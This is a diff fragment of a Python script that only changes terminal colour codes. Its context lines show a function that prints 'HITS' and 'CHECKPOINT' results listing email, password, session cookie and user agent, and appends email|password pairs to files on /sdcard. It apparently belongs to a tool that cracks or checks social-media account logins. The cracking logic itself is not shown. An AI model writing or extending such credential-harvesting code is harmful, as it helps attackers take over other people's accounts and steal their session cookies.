@@ -15,7 +15,7 @@ from bs4 import BeautifulSoup as bs4
 li = "\033[38;5;46m"
 blue = "\033[94m"
 white = "\033[1;97m"
-cyan = "\033[1;36m"
+cyan = "\033[0;36m"
 yellow = "\033[0;33m"
 black = "\033[0;30m"
 lr = "\033[1;31m"
@@ -594,11 +594,11 @@ def gxdsAPI(uid, pxss, tl):
                 )
                 print(
                     f"""{lgr}  [GXDS HITS]
-\033[1;36m  EMAIL  :\033[0;33m {uid} 
-\033[1;36m  PASS   :\033[0;33m {ps} 
-\033[1;36m  JOINED :\033[0;33m {yrs}
-\033[1;36m  COOKIE :\033[0;33m {coki}
-\033[1;36m  AGENT  :\033[0;33m {ugen}
+\033[0;36m  EMAIL  :\033[0;33m {uid} 
+\033[0;36m  PASS   :\033[0;33m {ps} 
+\033[0;36m  JOINED :\033[0;33m {yrs}
+\033[0;36m  COOKIE :\033[0;33m {coki}
+\033[0;36m  AGENT  :\033[0;33m {ugen}
 """
                 )
                 open("/sdcard/gxds-ok.txt", "a").write(uid + "|" + ps + "\n")
@@ -614,11 +614,11 @@ def gxdsAPI(uid, pxss, tl):
                 )
                 print(
                     f"""{lr}  [GXDS CHECKPOINT]
-\033[1;36m  EMAIL  :\033[0;33m {uid} 
-\033[1;36m  PASS   :\033[0;33m {ps} 
-\033[1;36m  JOINED :\033[0;33m {yrs}
-\033[1;36m  COOKIE :\033[0;33m {coki}
-\033[1;36m  AGENT  :\033[0;33m {ugen}
+\033[0;36m  EMAIL  :\033[0;33m {uid} 
+\033[0;36m  PASS   :\033[0;33m {ps} 
+\033[0;36m  JOINED :\033[0;33m {yrs}
+\033[0;36m  COOKIE :\033[0;33m {coki}
+\033[0;36m  AGENT  :\033[0;33m {ugen}
 """
                 )
                 open("/sdcard/gxds-cp.txt", "a").write(uid + "|" + ps + "\n")
